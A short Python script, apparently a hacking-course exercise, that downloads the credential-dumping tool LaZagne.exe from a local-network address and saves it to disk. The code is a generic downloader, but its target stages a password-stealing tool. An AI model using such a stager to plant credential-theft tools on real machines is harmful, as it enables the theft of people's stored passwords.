#!/usr/bin/env python
import requests

def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_request.content)


download(r"http://192.168.0.1/LaZagne.exe")
